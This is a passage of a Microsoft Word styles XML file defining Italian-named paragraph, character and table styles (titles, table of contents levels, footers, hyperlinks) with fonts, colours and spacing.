    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:i w:val="1"/>
      <w:iCs w:val="1"/>
      <w:color w:val="272727"/>
    </w:rPr>
    <w:pPr>
      <w:keepNext w:val="1"/>
      <w:keepLines w:val="1"/>
      <w:spacing w:before="40" w:after="0"/>
      <w:outlineLvl w:val="8"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Carpredefinitoparagrafo" w:default="1">
    <w:name w:val="Default Paragraph Font"/>
    <w:uiPriority w:val="1"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
  </w:style>
  <w:style w:type="table" w:styleId="Tabellanormale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essunelenco" w:default="1">
    <w:name w:val="No List"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
  </w:style>
  <w:style w:type="table" w:styleId="Sfondochiaro">
    <w:name w:val="Light Shading"/>
    <w:basedOn w:val="Tabellanormale"/>
    <w:uiPriority w:val="60"/>
    <w:pPr>
      <w:spacing w:before="40" w:after="4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Informazionicontatto" w:customStyle="true">
    <w:uiPriority w:val="4"/>
    <w:name w:val="Informazioni contatto"/>
    <w:basedOn w:val="Normale"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="360" w:after="0"/>
      <w:contextualSpacing/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Titolo1Carattere" w:customStyle="1">
    <w:name w:val="Titolo 1 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo1"/>
    <w:uiPriority w:val="4"/>
    <w:rsid w:val="00690EFD"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="3F251D" w:themeColor="accent1"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="30"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Titolo2Carattere" w:customStyle="1">
    <w:name w:val="Titolo 2 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo2"/>
    <w:uiPriority w:val="4"/>
    <w:rsid w:val="00690EFD"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:caps/>
      <w:color w:val="3F251D" w:themeColor="accent1"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Titolo3Carattere" w:customStyle="1">
    <w:name w:val="Titolo 3 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo3"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00690EFD"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="3F251D" w:themeColor="accent1"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Titolo5Carattere" w:customStyle="1">
    <w:name w:val="Titolo 5 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo5"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00690EFD"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="1F120E" w:themeColor="accent1" w:themeShade="80"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Titolo6Carattere" w:customStyle="1">
    <w:name w:val="Titolo 6 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo6"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00690EFD"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="1F120E" w:themeColor="accent1" w:themeShade="7F"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Puntoelenco">
    <w:uiPriority w:val="7"/>
    <w:name w:val="List Bullet"/>
    <w:basedOn w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="5"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Numeroelenco">
    <w:uiPriority w:val="5"/>
    <w:name w:val="List Number"/>
    <w:basedOn w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="6"/>
      </w:numPr>
      <w:spacing/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo">
    <w:uiPriority w:val="2"/>
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:link w:val="TitoloCarattere"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="3F251D" w:themeColor="accent1" w:themeTint="FF" w:themeShade="FF"/>
      <w:sz w:val="60"/>
      <w:szCs w:val="60"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="440" w:after="40" w:line="240" w:lineRule="auto"/>
      <w:contextualSpacing/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="TitoloCarattere" w:customStyle="1">
    <w:name w:val="Titolo Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo"/>
    <w:uiPriority w:val="2"/>
    <w:rsid w:val="00FD1504"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="3F251D" w:themeColor="accent1"/>
      <w:kern w:val="28"/>
      <w:sz w:val="60"/>
      <w:szCs w:val="60"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sottotitolo">
    <w:uiPriority w:val="3"/>
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:link w:val="SottotitoloCarattere"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:caps w:val="1"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="300" w:after="40"/>
      <w:contextualSpacing/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="SottotitoloCarattere" w:customStyle="1">
    <w:name w:val="Sottotitolo Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Sottotitolo"/>
    <w:uiPriority w:val="3"/>
    <w:rsid w:val="00FD1504"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:caps/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Foto" w:customStyle="true">
    <w:uiPriority w:val="1"/>
    <w:name w:val="Foto"/>
    <w:basedOn w:val="Normale"/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="2400" w:after="400"/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Didascalia">
    <w:uiPriority w:val="2"/>
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:i w:val="1"/>
      <w:iCs w:val="1"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Titolo9Carattere" w:customStyle="1">
    <w:name w:val="Titolo 9 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo9"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="272727" w:themeColor="text1" w:themeTint="D8"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Titolo8Carattere" w:customStyle="1">
    <w:name w:val="Titolo 8 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo8"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:color w:val="272727" w:themeColor="text1" w:themeTint="D8"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolosommario">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Titolo1"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:before="0"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Pidipagina">
    <w:uiPriority w:val="99"/>
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:link w:val="PidipaginaCarattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="right"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="PidipaginaCarattere" w:customStyle="1">
    <w:name w:val="Piè di pagina Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Pidipagina"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="003422FF"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario3">
    <w:uiPriority w:val="39"/>
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:smallCaps w:val="1"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario1">
    <w:uiPriority w:val="39"/>
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:b w:val="1"/>
      <w:bCs w:val="1"/>
      <w:caps w:val="1"/>
      <w:u w:val="single"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="360" w:after="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario2">
    <w:uiPriority w:val="39"/>
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:b w:val="1"/>
      <w:bCs w:val="1"/>
      <w:smallCaps w:val="1"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testofumetto">
    <w:uiPriority w:val="99"/>
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="TestofumettoCarattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="TestofumettoCarattere" w:customStyle="1">
    <w:name w:val="Testo fumetto Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testofumetto"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Bibliografia">
    <w:uiPriority w:val="39"/>
    <w:name w:val="Bibliography"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Corpodeltesto3">
    <w:uiPriority w:val="99"/>
    <w:name w:val="Body Text 3"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="Corpodeltesto3Carattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="Tabellarelazione" w:customStyle="1">
    <w:name w:val="Tabella relazione"/>
    <w:basedOn w:val="Tabellanormale"/>
    <w:uiPriority w:val="99"/>
    <w:pPr>
      <w:spacing w:before="60" w:after="60" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:tblPr>
      <w:tblBorders>
        <w:top w:val="single" w:color="3F251D" w:themeColor="accent1" w:sz="4" w:space="0"/>
        <w:left w:val="single" w:color="3F251D" w:themeColor="accent1" w:sz="4" w:space="0"/>
        <w:bottom w:val="single" w:color="3F251D" w:themeColor="accent1" w:sz="4" w:space="0"/>
        <w:right w:val="single" w:color="3F251D" w:themeColor="accent1" w:sz="4" w:space="0"/>
        <w:insideH w:val="single" w:color="3F251D" w:themeColor="accent1" w:sz="4" w:space="0"/>
        <w:insideV w:val="single" w:color="3F251D" w:themeColor="accent1" w:sz="4" w:space="0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Grigliatabella">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="Tabellanormale"/>
    <w:uiPriority w:val="59"/>
    <w:pPr>
      <w:spacing w:before="0"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Intestazione">
    <w:uiPriority w:val="99"/>
    <w:name w:val="header"/>
    <w:basedOn w:val="Normale"/>
    <w:unhideWhenUsed/>
    <w:link w:val="IntestazioneCarattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntestazioneCarattere" w:customStyle="1">
    <w:name w:val="Intestazione Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Intestazione"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="001A2000"/>
  </w:style>
  <w:style w:type="character" w:styleId="Corpodeltesto3Carattere" w:customStyle="1">
    <w:name w:val="Corpo del testo 3 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Corpodeltesto3"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Rimandocommento">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Rientrocorpodeltesto3">
    <w:uiPriority w:val="99"/>
    <w:name w:val="Body Text Indent 3"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="Rientrocorpodeltesto3Carattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Rientrocorpodeltesto3Carattere" w:customStyle="1">
    <w:name w:val="Rientro corpo del testo 3 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Rientrocorpodeltesto3"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testocommento">
    <w:uiPriority w:val="99"/>
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="TestocommentoCarattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="TestocommentoCarattere" w:customStyle="1">
    <w:name w:val="Testo commento Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testocommento"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr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A122DB"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SoggettocommentoCarattere" w:customStyle="1">
    <w:name w:val="Soggetto commento Carattere"/>
    <w:basedOn w:val="TestocommentoCarattere"/>
    <w:link w:val="Soggettocommento"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Mappadocumento">
    <w:uiPriority w:val="99"/>
    <w:name w:val="Document Map"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="MappadocumentoCarattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="MappadocumentoCarattere" w:customStyle="1">
    <w:name w:val="Mappa documento Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Mappadocumento"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testonotadichiusura">
    <w:uiPriority w:val="99"/>
    <w:name w:val="endnote text"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="TestonotadichiusuraCarattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="TestonotadichiusuraCarattere" w:customStyle="1">
    <w:name w:val="Testo nota di chiusura Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testonotadichiusura"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Indirizzomittente">
    <w:uiPriority w:val="99"/>
    <w:name w:val="envelope return"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Constantia" w:hAnsi="Constantia" w:eastAsia="" w:cs="" w:asciiTheme="majorAscii" w:hAnsiTheme="majorAscii" w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testonotaapidipagina">
    <w:uiPriority w:val="99"/>
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="TestonotaapidipaginaCarattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="TestonotaapidipaginaCarattere" w:customStyle="1">
    <w:name w:val="Testo nota a piè di pagina Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testonotaapidipagina"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CodiceHTML">
    <w:name w:val="HTML Code"/>
    <w:basedOn w:val="Carpredefinitoparagrafo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PreformattatoHTML">
    <w:uiPriority w:val="99"/>
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="PreformattatoHTMLCarattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="PreformattatoHTMLCarattere" w:customStyle="1">
    <w:name w:val="Preformattato HTML Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="PreformattatoHTML"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="TastieraHTML">
    <w:name w:val="HTML Keyboard"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="MacchinadascrivereHTML">
    <w:name w:val="HTML Typewriter"/>
    <w:basedOn w:val="Carpredefinitoparagrafo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Testomacro">
    <w:name w:val="macro"/>
    <w:link w:val="TestomacroCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122D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styleId="TestomacroCarattere" w:customStyle="1">
    <w:name w:val="Testo macro Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testomacro"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testonormale">
    <w:uiPriority w:val="99"/>
    <w:name w:val="Plain Text"/>
    <w:basedOn w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:link w:val="TestonormaleCarattere"/>
    <w:rsid w:val="21040C4D"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
    </w:rPr>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="TestonormaleCarattere" w:customStyle="1">
    <w:name w:val="Testo normale Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testonormale"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Testosegnaposto">
    <w:name w:val="Placeholder Text"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario4">
    <w:uiPriority w:val="39"/>
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario5">
    <w:uiPriority w:val="39"/>
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario6">
    <w:uiPriority w:val="39"/>
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario7">
    <w:uiPriority w:val="39"/>
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario8">
    <w:uiPriority w:val="39"/>
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario9">
    <w:uiPriority w:val="39"/>
    <w:name w:val="toc 9"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="21040C4D"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Collegamentoipertestuale">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004A3D0B"/>
    <w:rPr>
      <w:color w:val="993E21" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
